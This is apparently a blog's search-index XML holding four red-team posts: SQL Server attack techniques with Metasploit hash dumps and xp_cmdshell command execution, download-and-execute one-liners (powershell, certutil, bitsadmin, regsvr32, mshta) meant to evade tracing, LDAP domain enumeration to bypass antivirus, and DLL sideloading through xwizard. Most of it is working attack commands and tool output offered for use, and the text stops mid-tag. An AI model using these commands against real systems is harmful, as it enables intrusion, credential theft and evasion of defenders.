<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Sqlserver common attack methods</title>
      <link href="2021/07/24/sqlserver-common-attack-methods/"/>
      <url>2021/07/24/sqlserver-common-attack-methods/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">Default port 1433, NMAP fingerprint is as follows:PORT     STATE SERVICE  VERSION1433&#x2F;tcp open  ms-sql-s Microsoft SQL Server 2012 11.00.2100.00; RTM| ms-sql-ntlm-info:|   Target_Name: ROOTKIT|   NetBIOS_Domain_Name: ROOTKIT|   NetBIOS_Computer_Name: SRV-WEB-KIT|   DNS_Domain_Name: rootkit.org|   DNS_Computer_Name: Srv-Web-Kit.rootkit.org|   DNS_Tree_Name: rootkit.org|_  Product_Version: 6.3.9600Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windowsHost script results:| ms-sql-info:|   192.168.3.73:1433:|     Version:|       name: Microsoft SQL Server 2012 RTM|       number: 11.00.2100.00|       Product: Microsoft SQL Server 2012|       Service pack level: RTM|       Post-SP patches applied: false|_    TCP port: 1433<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="The-system-tables"><a href="#The-system-tables" class="headerlink" title="The system tables"></a>The system tables</h3><pre class="line-numbers language-none"><code class="language-none">Master: Records all system-level informationModel: Template database, such as for database size, collation, recovery model, and other database options, will be used for any database that is later createdMSDB: Arrange alarm and operationTempdb: Space to hold temporary objects or intermediate result setsResouce: read-only, containing the attached system objects that are physically persistent in the resource database and appear in sys mode for each database<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Grammar-supplement"><a href="#Grammar-supplement" class="headerlink" title="Grammar supplement"></a>Grammar supplement</h3><pre class="line-numbers language-none"><code class="language-none">View all databasesSELECT Name FROM Master.. SysDatabases ORDER BY NameSELECT name FROM master.dbo.sysdatabasesView the name of the tableSELECT * FROM #databaseName#.INFORMATION_SCHEMA.TABLES;View service linksEXEC sp_linkedserversSELECT * FROM sys.servers;To view the userselect sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled &#x3D; 1 then &#39;Disabled&#39; else &#39;Enabled&#39; end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id &#x3D; sl.principal_id where sp.type not in (&#39;G&#39;, &#39;R&#39;) order by sp.name;Create a userCREATE LOGIN yangsir WITH PASSWORD &#x3D; &#39;Yangsirnb123&#39;sp_addsrvrolemember &#39;yangsir&#39;, &#39;sysadmin&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="Information-collection"><a href="#Information-collection" class="headerlink" title="Information collection"></a>Information collection</h3><h4 id="use-admin-mssql-mssql-enum-domain-accounts-about-domain-account"><a href="#use-admin-mssql-mssql-enum-domain-accounts-about-domain-account" class="headerlink" title="use admin/mssql/mssql_enum_domain_accounts about domain account"></a>use admin/mssql/mssql_enum_domain_accounts about domain account</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_enum_domain_accounts) &gt; run[*] Running module against 192.168.3.73[*] 192.168.3.73:1433 - Attempting to connect to the database server at 192.168.3.73:1433 as sa...[+] 192.168.3.73:1433 - Connected.[*] 192.168.3.73:1433 - SQL Server Name: SRV-WEB-KIT[*] 192.168.3.73:1433 - Domain Name: ROOTKIT[+] 192.168.3.73:1433 - Found the domain sid: 010500000000000515000000e23e1be0b3ff69b2200c3dd5[*] 192.168.3.73:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...[*] 192.168.3.73:1433 -  - ROOTKIT\Administrator[*] 192.168.3.73:1433 -  - ROOTKIT\Guest[*] 192.168.3.73:1433 -  - ROOTKIT\krbtgt[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Admins[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Users[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Guests[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Computers[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Controllers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="use-admin-mssql-mssql-enum-sql-logins-about-login-user"><a href="#use-admin-mssql-mssql-enum-sql-logins-about-login-user" class="headerlink" title="use admin/mssql/mssql_enum_sql_logins about login user"></a>use admin/mssql/mssql_enum_sql_logins about login user</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_enum_sql_logins) &gt; run[*] Running module against 192.168.3.73[*] 192.168.3.73:1433 - Attempting to connect to the database server at 192.168.3.73:1433 as sa...[+] 192.168.3.73:1433 - Connected.[*] 192.168.3.73:1433 - Checking if sa has the sysadmin role...[+] 192.168.3.73:1433 - sa is a sysadmin.[*] 192.168.3.73:1433 - Setup to fuzz 300 SQL Server logins.[*] 192.168.3.73:1433 - Enumerating logins...[+] 192.168.3.73:1433 - 35 initial SQL Server logins were found.[*] 192.168.3.73:1433 - Verifying the SQL Server logins...[+] 192.168.3.73:1433 - 10 SQL Server logins were verified:[*] 192.168.3.73:1433 -  - ##MS_PolicyEventProcessingLogin##[*] 192.168.3.73:1433 -  - ##MS_PolicyTsqlExecutionLogin##[*] 192.168.3.73:1433 -  - NT AUTHORITY\SYSTEM[*] 192.168.3.73:1433 -  - NT SERVICE\MSSQLSERVER[*] 192.168.3.73:1433 -  - NT SERVICE\SQLSERVERAGENT[*] 192.168.3.73:1433 -  - NT SERVICE\SQLWriter[*] 192.168.3.73:1433 -  - NT SERVICE\Winmgmt[*] 192.168.3.73:1433 -  - ROOTKIT\dbadmin[*] 192.168.3.73:1433 -  - ROOTKIT\sqladmin[*] 192.168.3.73:1433 -  - sa[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="use-auxiliary-admin-mssql-mssql-findandsampledata-some-interest-data"><a href="#use-auxiliary-admin-mssql-mssql-findandsampledata-some-interest-data" class="headerlink" title="use auxiliary/admin/mssql/mssql_findandsampledata some interest data"></a>use auxiliary/admin/mssql/mssql_findandsampledata some interest data</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_findandsampledata) &gt; run[*] 192.168.3.73:1433     - Attempting to connect to the SQL Server at 192.168.3.73:1433...[+] 192.168.3.73:1433     - Successfully connected to 192.168.3.73:1433[*] 192.168.3.73:1433     - Attempting to retrieve data ...[*] 192.168.3.73:1433     - SRV-WEB-KIT                   , LazyOA                        , dbo                           , Sys_User                      , PassWord                      , nvarchar                      , cfcd208495d565ef66e7dff9f98764, 5[*] 192.168.3.73:1433     - SRV-WEB-KIT                   , LazyOA                        , dbo                           , WC_Forum_User                 , PasswordType                  , int                           , 1                             , 1[*] 192.168.3.73:1433     - SRV-WEB-KIT                   , LazyOA                        , dbo                           , WM_Users                      , Password                      , nvarchar                      , 123                           , 7[*] 192.168.3.73:1433     - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="use-auxiliary-scanner-mssql-mssql-hashdump-get-password"><a href="#use-auxiliary-scanner-mssql-mssql-hashdump-get-password" class="headerlink" title="use auxiliary/scanner/mssql/mssql_hashdump  get password"></a>use auxiliary/scanner/mssql/mssql_hashdump  get password</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(scanner&#x2F;mssql&#x2F;mssql_hashdump) &gt; run[*] 192.168.3.73:1433     - Instance Name: nil[+] 192.168.3.73:1433     - Saving mssql12 &#x3D; sa:020008da5345d7acb57f6e081ab60b39cdd31a939c06d3ad751fa9fcdad7d17d864013f33f6bf013dd74e2559a2b82deb5776167ce4db13632b9d43ca62b17d335320f1e2399[+] 192.168.3.73:1433     - Saving mssql12 &#x3D; ##MS_PolicyEventProcessingLogin##:0200ce4fb17bbcb091201639a75dfef7681df56c695e199076214dfee2308db01792cb4266d9e650aeb823d694359f9b32b4250954ae0c399a7f59b33ca68eaa9c43a173adf4[+] 192.168.3.73:1433     - Saving mssql12 &#x3D; ##MS_PolicyTsqlExecutionLogin##:0200400c2a7a6af4d09e573e8a6ef82c3d171d3d77103df288f079c35b012b94e8bb6b8c26b6902cd0a3f37419bdab1fb8f83c1d0536e4bd374785c6623907139b1102e9f681[*] 192.168.3.73:1433     - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Elevated-privileges"><a href="#Elevated-privileges" class="headerlink" title="Elevated privileges"></a>Elevated privileges</h3><pre class="line-numbers language-none"><code class="language-none">use admin&#x2F;mssql&#x2F;mssql_escalate_execute_as need IMPERSONATION use admin&#x2F;mssql&#x2F;mssql_escalate_dbowner need dbowner<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Command-execution"><a href="#Command-execution" class="headerlink" title="Command execution"></a>Command execution</h3><h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><pre class="line-numbers language-none"><code class="language-none">use admin&#x2F;mssql&#x2F;mssql_exec use exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_payloaduse exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_linkcrawler msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_exec) &gt; run[*] Running module against 192.168.3.73[*] 192.168.3.73:1433 - The server may have xp_cmdshell disabled, trying to enable it...[*] 192.168.3.73:1433 - SQL Query: EXEC master..xp_cmdshell &#39;whoami&#39; output ------ rootkit\dbadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h4><pre class="line-numbers language-none"><code class="language-none">crackmapexec mssql 192.168.3.73 -d rootkit.org -u sqladmin -p Admin12345 -x &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724132256320.png"></p><h4 id="use-xpcmdshell"><a href="#use-xpcmdshell" class="headerlink" title="use xpcmdshell"></a>use xpcmdshell</h4><pre class="line-numbers language-none"><code class="language-none">open xpcmdshellsp_configure &#39;show advanced options&#39;, &#39;1&#39;RECONFIGUREsp_configure &#39;xp_cmdshell&#39;, &#39;1&#39;RECONFIGUREthen use theseEXEC master..xp_cmdshell &#39;whoami&#39;EXEC xp_cmdshell &quot;whoami&quot;;EXEC master.dbo.xp_cmdshell &#39;cmd.exe dir c:&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724132756918.png"></p><pre class="line-numbers language-none"><code class="language-none">get direxecute master..xp_dirtree &#39;c:&#39;execute master..xp_dirtree &#39;c:&#39;,1 execute master..xp_dirtree &#39;c:&#39;,1,1 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724134413840.png"></p><pre class="line-numbers language-none"><code class="language-none">python execEXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;print(__import__(&quot;getpass&quot;).getuser())&#39;EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;print(__import__(&quot;os&quot;).system(&quot;whoami&quot;))&#39;EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;print(open(&quot;C:\\inetpub\\wwwroot\\web.config&quot;, &quot;r&quot;).read())&#39;EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;import sysprint(sys.version)&#39;GO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="sqlserver-amp-smbrelay"><a href="#sqlserver-amp-smbrelay" class="headerlink" title="sqlserver&amp;smbrelay"></a>sqlserver&amp;smbrelay</h3><pre class="line-numbers language-none"><code class="language-none">No relevant environment is currently availableyou can read:https:&#x2F;&#x2F;www.netspi.com&#x2F;blog&#x2F;technical&#x2F;network-penetration-testing&#x2F;executing-smb-relay-attacks-via-sql-server-using-metasploit&#x2F;like this:msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; optionsModule options (auxiliary&#x2F;admin&#x2F;mssql&#x2F;mssql_ntlm_stealer):   Name                 Current Setting  Required  Description   ----                 ---------------  --------  -----------   PASSWORD             admin            no        The password for the specified username   RHOSTS               192.168.3.73     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT                1433             yes       The target port (TCP)   SMBPROXY             0.0.0.0          yes       IP of SMB proxy or sniffer.   TDSENCRYPTION        false            yes       Use TLS&#x2F;SSL for TDS data &quot;Force Encryption&quot;   THREADS              1                yes       The number of concurrent threads (max one per host)   USERNAME             sa               no        The username to authenticate as   USE_WINDOWS_AUTHENT  true             yes       Use windows authentification (requires DOMAIN option set)msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; set smbproxy targetip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="about-mssqlclient-py"><a href="#about-mssqlclient-py" class="headerlink" title="about mssqlclient.py"></a>about mssqlclient.py</h3><pre class="line-numbers language-none"><code class="language-none">python3 mssqlclient.py -db master -windows-auth rootkit.org&#x2F;sqladmin:Admin12345@192.168.3.73<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724135209969.png"></p><h3 id="about-sqsh"><a href="#about-sqsh" class="headerlink" title="about sqsh"></a>about sqsh</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724140056645.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Information collection </tag>
            
            <tag> Sqlserver </tag>
            
            <tag> Database </tag>
            
            <tag> Command execution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Some ways to download files remotely from Github</title>
      <link href="2021/07/23/some-ways-to-download-files-remotely-from-github/"/>
      <url>2021/07/23/some-ways-to-download-files-remotely-from-github/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">The goal is to improve the traceability cost, avoid being detected by the traceability, and improve the concealmentExisting documents:https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exeYou need to download to C:\test and execute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><pre class="line-numbers language-none"><code class="language-none">powershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&#39;,&#39;C:\test\yang.exe&#39;);start-process &#39;C:\test\yang.exe&#39;powershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&#39;,&#39;c:\\test\\yang.exe&#39;);start-process &#39;c:\\test\\yang.exe&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><pre class="line-numbers language-none"><code class="language-none">certutil -urlcache -split -f https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe C:\test\yang.exe&amp;&amp;C:\test\yang.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h3><pre class="line-numbers language-none"><code class="language-none">Slow, not recommendedbitsadmin &#x2F;transfer n https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe C:\test\yang.exe &amp;&amp; C:\test\yang.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h3><pre class="line-numbers language-none"><code class="language-none">Run the regsve32-vbs-download-execregsvr32 &#x2F;s &#x2F;i:https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;download.sct   scrobj.dllUse this:Const adTypeBinary &#x3D; 1Const adSaveCreateOverWrite &#x3D; 2Dim http,adoSet http &#x3D; CreateObject(&quot;Msxml2.ServerXMLHTTP.6.0&quot;)http.SetOption 2, 13056http.open &quot;GET&quot;,&quot;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&quot;,Falsehttp.sendSet ado &#x3D; createobject(&quot;Adodb.Stream&quot;)ado.Type &#x3D; adTypeBinaryado.Openado.Write http.responseBodyado.SaveToFile &quot;C:\test\yang.exe&quot;ado.Close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723213650376.png"></p><pre class="line-numbers language-none"><code class="language-none">Run the regsve32-JS-ps-download-execregsvr32 &#x2F;u &#x2F;s &#x2F;i:https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;download.sct scrobj.dllUse this:new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&#39;,&#39;c:\\test\\yang.exe&#39;);start-process &#39;c:\\test\\yang.exe&#39;&quot;,0,true);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h3><pre class="line-numbers language-none"><code class="language-none">Mshta supports http&amp;https, where the script must be an HTML page to run, otherwise it will be parsed as textThe local environment is used as an examplemshta http:&#x2F;&#x2F;127.0.0.1&#x2F;calc.hta<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723222036052.png"></p><pre class="line-numbers language-none"><code class="language-none">Make sure the download executes successfully to PowerShellpowershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&#39;,&#39;C:\test\yang.exe&#39;);start-process &#39;C:\test\yang.exe&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723222405255.png"></p><h3 id="IEExec"><a href="#IEExec" class="headerlink" title="IEExec"></a>IEExec</h3><pre class="line-numbers language-none"><code class="language-none">Encountered pit point, not yet solved, later reviewcd C:\Windows\Microsoft.NET\Framework\v2.0.50727\caspol -s offIEExec http:&#x2F;&#x2F;192.168.3.8&#x2F;yang.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723223302420.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> File download </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Supplementary information about obtaining LDAP information</title>
      <link href="2021/07/23/supplementary-information-about-obtaining-ldap-information/"/>
      <url>2021/07/23/supplementary-information-about-obtaining-ldap-information/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">The project encountered a pit point, some complement, the method of obtaining information to complement, in order to better bypass AV<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="csvde"><a href="#csvde" class="headerlink" title="csvde"></a>csvde</h2><pre class="line-numbers language-none"><code class="language-none">The target information is exported, and the output product is in CSV format. The actual Chinese exported will have garbled charactersMain applicable versions:Windows Server 2003, Windows Server 2008, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012, Windows Server 2003 with SP1, Windows 8Operation Manual:https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;previous-versions&#x2F;windows&#x2F;it-pro&#x2F;windows-server-2012-r2-and-2012&#x2F;cc732101(v&#x3D;ws.11)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">All information in the domain:csvde -f 1.csvInformation about all users in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;person))&quot;Information about all machines in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;computer))&quot;Information about all groups in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;group))&quot;Information about all administrator groups in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;group)(name&#x3D;Domain Admins))&quot;All OU information in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;organizationalUnit))&quot;All domain user names in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;person))&quot; -l SamAccountNameAll computer names in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;computer))&quot; -l nameRemote export:Csvde -s 192.168.3.144 -a rootkit.org\sqladmin Admin12345 -f all.csv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ldifde"><a href="#ldifde" class="headerlink" title="ldifde"></a>ldifde</h2><pre class="line-numbers language-none"><code class="language-none">Main applicable versions:Windows Server 2003, Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, Windows Server 2003 with SP1, Windows 8Operation Manual:https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;previous-versions&#x2F;windows&#x2F;it-pro&#x2F;windows-server-2012-r2-and-2012&#x2F;cc731033(v&#x3D;ws.11)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Supplementary%20information%20about%20obtaining%20LDAP%20information/image-20210722152525595.png" alt="image"></p><h3 id="Actual-use-1"><a href="#Actual-use-1" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">All information in the domain:ldifde -f 2.txtInformation about all users in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;person))&quot; -f 2.txtInformation about all machines in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;computer))&quot; -f 2.txtInformation about all groups in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;group))&quot; -f 2.txtInformation about all administrator groups in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;group)(name&#x3D;Domain Admins))&quot; -f 2.txtAll OU information in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;organizationalUnit))&quot; -f 2.txtAll domain user names in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;person))&quot; -l SamAccountName -f 2.txtAll computer names in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;computer))&quot; -l name -f 2.txtRemote export:Ldifde -s 192.168.3.144 -a rootkit.org\sqladmin Admin12345 -f 2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Supplementary%20information%20about%20obtaining%20LDAP%20information/image-20210722152733426.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> Essays record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> Intranet Information Collection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xwizard Microsoft program use white and black</title>
      <link href="2021/07/23/xwizard-microsoft-program-use-white-and-black/"/>
      <url>2021/07/23/xwizard-microsoft-program-use-white-and-black/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">xwizard.exe use xwizards.dll，Support win7 and above system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145222987.png" alt="image"></p><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-none"><code class="language-none">such as Path: C:\Windows\System32Use case:xwizard processXMLFile 1.txtxwizard RunWizard &#x2F;u &#123;11111111-1111-1111-1111-111111111111&#125;xwizard RunPropertySheet &#x2F;u &#123;11111111-1111-1111-1111-111111111111&#125;Note that the GUID length needs to be fixed, otherwise an error will be reported<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210722160656515.png" alt="image"></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">The popover code is as follows:#include &quot;pch.h&quot;#includeBOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:MessageBox(NULL, &quot;yyy&quot;, &quot;y&quot;, MB_OK);WinExec(&quot;calc.exe&quot;, SW_HIDE);case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;Running the program directly will not trigger the popover<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145554786.png" alt="image"></p><pre class="line-numbers language-none"><code class="language-none">Confirm that the popover can be triggered after the normal call<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 